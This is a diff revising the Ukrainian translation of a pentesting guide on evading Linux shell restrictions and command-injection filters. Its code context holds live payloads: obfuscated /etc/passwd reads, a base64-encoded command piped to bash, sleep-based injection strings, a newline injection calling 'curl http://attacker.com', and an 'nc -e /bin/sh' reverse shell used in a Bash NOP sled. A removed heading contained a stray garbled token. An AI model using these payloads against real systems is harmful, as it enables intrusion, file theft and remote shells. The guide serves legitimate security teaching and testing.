@@ -2,9 +2,9 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Обхід поширених обмежень
+## Обходи поширених обмежень
 
-Колекції command-injection і WAF-evasion у PayloadsAllTheThings, cheat sheet Bo0oM, а також дві пов’язані статті Secjuice містять довідкову інформацію про варіації shell-синтаксису в цьому розділі.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
+Колекції command-injection і WAF-evasion у PayloadsAllTheThings, cheat sheet Bo0oM і дві пов’язані статті Secjuice містять довідкову інформацію про варіації shell-синтаксису в цьому розділі.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
 
 ### Reverse Shell
 ```bash
@@ -107,7 +107,7 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Обхід backslash і slash
+### Обхід зворотної косої риски та косої риски
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
@@ -116,7 +116,7 @@ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Обхід за допомогою hex-кодування
+### Обхід за допомогою hex encoding
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -140,14 +140,14 @@ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### DNS data exfiltration
+### Ексфільтрація даних через DNS
 
-Для out-of-band callbacks сервіс на кшталт Burp Collaborator може змусити цільовий застосунок взаємодіяти із зовнішнім сервером; наявне посилання [**pingb**](http://pingb.in) збережено для історичної навігації, а не як твердження про його поточну доступність.<sup>[[6]](#references)</sup>
+Для out-of-band callbacks сервіс на кшталт Collaborator, такий як Burp Collaborator, може змусити цільовий застосунок взаємодіяти із зовнішнім сервером; наявне посилання [**pingb**](http://pingb.in) збережено для історичної навігації, а не як твердження про його поточну доступність.<sup>[[6]](#references)</sup>
 
-### Builtins
+### Вбудовані команди
 
-В обмеженій оболонці доступні builtins є залишковою поверхнею команд для цих прикладів; Bash документує свої builtin-команди та граматику виконання.<sup>[[7]](#references)</sup> Ідея від [**devploit**](https://twitter.com/devploit).\
-Почніть із наявної навігації [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html), а потім спробуйте такі специфічні для Bash техніки:<sup>[[7]](#references)</sup>
+В обмеженій оболонці доступні вбудовані команди є залишковою поверхнею команд для цих прикладів; Bash документує свої вбудовані команди та граматику виконання.<sup>[[7]](#references)</sup> Ідея від [**devploit**](https://twitter.com/devploit).\
+Почніть із наявної навігації [**вбудованих команд shell**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html), а потім спробуйте такі специфічні для Bash методи:<sup>[[7]](#references)</sup>
 ```bash
 # Get list of builtins
 declare builtins
@@ -204,21 +204,21 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Обхід потенційних regex_久久爱
+### Обхід потенційних regex
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
 ### Bashfuscator
 
-Наведена нижче команда використовує Bashfuscator, фреймворк із відкритим кодом для обфускації Bash; посилання на репозиторій у коментарі до коду збережено для навігації.<sup>[[8]](#references)</sup>
+Наведений нижче виклик використовує Bashfuscator — open-source framework для обфускації Bash; посилання на repository у коментарі коду збережено для навігації.<sup>[[8]](#references)</sup>
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
-### RCE з 5 символів
+### RCE із 5 символами
 
-Наведені нижче два історичні приклади з 5 символів збережено для відтворення challenge: основний репозиторій challenge доступний у [репозиторії Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges), тоді як доступність другого посилання на write-up у блоці коду наразі не перевірялася.<sup>[[9]](#references)</sup>
+Наведені нижче два історичні приклади з 5 символів збережено як відтворення challenge: основний репозиторій challenge доступний у [репозиторії Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges), тоді як друге посилання на write-up у блоці коду є навігаційним, і його поточна доступність не перевірялася.<sup>[[9]](#references)</sup>
 ```bash
 # From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Orange Tsai solution
@@ -302,45 +302,45 @@ ln /f*
 ```
 ## Обхід Read-Only/Noexec/Distroless
 
-Якщо ви перебуваєте всередині файлової системи із захистом **read-only і noexec** або в **distroless image**, середовище накладає обмеження на виконання, задокументовані в Linux `mount(8)` і проєкті Distroless; на пов’язаній сторінці зібрано техніки роботи в таких умовах.<sup>[[11]](#references)[[12]](#references)</sup>
+Якщо ви перебуваєте всередині файлової системи із захистом **read-only і noexec** або в **distroless image**, середовище накладає обмеження на виконання, задокументовані в Linux `mount(8)` та проєкті Distroless; на сторінці за посиланням зібрано техніки роботи в таких умовах.<sup>[[11]](#references)[[12]](#references)</sup>
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Обхід Chroot та інших Jails
+## Обхід Chroot та інших ізольованих середовищ
 
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
 {{#endref}}
 
-## Bash NOP Sled на основі пробілів ("Bashsledding")
+## NOP Sled у Bash на основі пробілів ("Bashsledding")
 
-Коли вразливість дає змогу частково контролювати аргумент, який зрештою передається до `system()` або іншої shell, зміщення payload може бути невизначеним. Alan Cao і Will Tan описують випадок для embedded-пристрою з обмеженнями, у якому shell payload розпилювався в memory-mapped NVRAM і доповнювався пробілами на початку.<sup>[[5]](#references)</sup>
+Коли вразливість дає змогу частково контролювати аргумент, який зрештою передається до `system()` або іншої shell, зміщення payload може бути невизначеним. Alan Cao і Will Tan описують випадок з обмеженими embedded-пристроями, де shell payload розпилювався в memory-mapped NVRAM і доповнювався префіксом із пробілів.<sup>[[5]](#references)</sup>
 
-Тому можна створити *NOP sled для Bash*, додавши перед реальною командою довгу послідовність пробілів або символів табуляції; Bash визначає пробіли й табуляції як blank-символи, що розділяють слова в простій команді.<sup>[[5]](#references)[[7]](#references)</sup>
+Тому можна створити *NOP sled для Bash*, додавши перед реальною командою довгу послідовність пробілів або символів табуляції; Bash визначає пробіли й табуляції як blank-символи, що розділяють слова у простій команді.<sup>[[5]](#references)[[7]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-Якщо ROP chain (або інший memory-corruption primitive) передає вказівник на рядок команди, який починається будь-де всередині блоку пробілів, Bash може обробити решту початкових пробілів, доки не досягне команди; в експлойті d router це зробило невизначені зміщення рядків придатними до використання.<sup>[[5]](#references)[[7]](#references)</sup>
+Якщо ROP chain (або інший примітив пошкодження пам’яті) передає pointer на command-string, який починається в будь-якому місці блоку пробілів, Bash може обробити решту початкових пробілів, доки не досягне команди; у наведеному exploit маршрутизатора це зробило невизначені зміщення рядка придатними для використання.<sup>[[5]](#references)[[7]](#references)</sup>
 
-Практичні випадки використання на constrained embedded targets включають:<sup>[[5]](#references)</sup>
+Практичні випадки використання на обмежених embedded-цілях включають:<sup>[[5]](#references)</sup>
 
 1. **Memory-mapped configuration blobs** (наприклад, NVRAM), доступні між процесами.<sup>[[5]](#references)</sup>
 2. Канали payload, у яких attacker не може записувати NULL bytes для вирівнювання payload (загальна адаптація проблеми вирівнювання).<sup>[[5]](#references)</sup>
-3. Embedded devices із невеликим середовищем BusyBox `ash`/`sh`, яке BusyBox описує як applets у resource-constrained systems.<sup>[[10]](#references)</sup>
+3. Embedded-пристрої з невеликим середовищем BusyBox `ash`/`sh`, яке BusyBox документує як applets у системах з обмеженими ресурсами.<sup>[[10]](#references)</sup>
 
-> 🛠️  Поєднуйте цю техніку з ROP gadgets, які викликають `system()`, у контрольованій лабораторії; дослідження d router демонструє це поєднання на constrained hardware.<sup>[[5]](#references)</sup>
+> 🛠️ Поєднуйте цю техніку з ROP gadgets, які викликають `system()` у контрольованій лабораторії; наведене дослідження маршрутизатора демонструє таке поєднання на hardware з обмеженими ресурсами.<sup>[[5]](#references)</sup>
 
 ## References
 
-- [1] [PayloadsAllTheThings - Ін'єкція команд](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
-- [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [3] [Методи обходу Web Application Firewall (WAF) #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [4] [Методи обходу Web Application Firewall (WAF) #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
-- [5] [Alan Cao і Will Tan — Експлуатація zero days у занедбаному hardware – блог Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [1] [PayloadsAllTheThings - Ін’єкція команд](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
+- [2] [Bo0oM - Пам’ятка з обходу WAF](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
+- [3] [Техніки обходу Web Application Firewall (WAF) #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Техніки обходу Web Application Firewall (WAF) #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [5] [Alan Cao and Will Tan — Експлуатація zero days у покинутому hardware – блог Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 - [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
 - [7] [bash(1) — сторінка посібника Linux](https://man7.org/linux/man-pages/man1/bash.1.html)
 - [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
